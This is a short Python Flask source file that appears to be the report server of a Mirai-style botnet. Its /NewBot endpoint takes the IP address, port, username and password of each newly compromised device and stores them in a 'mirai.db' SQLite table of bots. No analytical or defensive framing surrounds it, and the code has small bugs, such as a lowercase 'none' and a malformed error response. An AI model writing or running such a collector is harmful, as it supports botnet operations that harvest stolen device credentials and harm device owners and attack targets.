import sqlite3
from app import app
from flask import g, request, jsonify

DATABASE = "mirai.db"
CREATE_STMT = "CREATE TABLE IF NOT EXISTS bots (ip string, port int, uname string, pword string)"

@app.route("/NewBot", methods = ['POST'])
def new_bot():
    data = request.get_json()
    ip = data.get("ip")
    port = data.get("port")
    uname = data.get("uname")
    pword = data.get("pword")

    if (ip is not None and
            port is not None and
            uname is not None and
            pword is not None):
        c = get_db().cursor()
        i_port = int(port)
        c.execute("INSERT INTO bots (ip, port, uname, pword) values (?, ?, ?, ?)", (ip, i_port, uname, pword))
        get_db().commit()
        return jsonify({'success': True})
    else:
        print("error")
        return jsonify({'success': False,
                 'message': "Bad Request"},
                 400,
                 {'ContentType':'application/json'})

def add_bot_to_db(data):
    pass

def query_db(query, args=(), one=False):
    cur = get_db().execute(query, args)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else none) if one else rv

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.execute(CREATE_STMT)
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

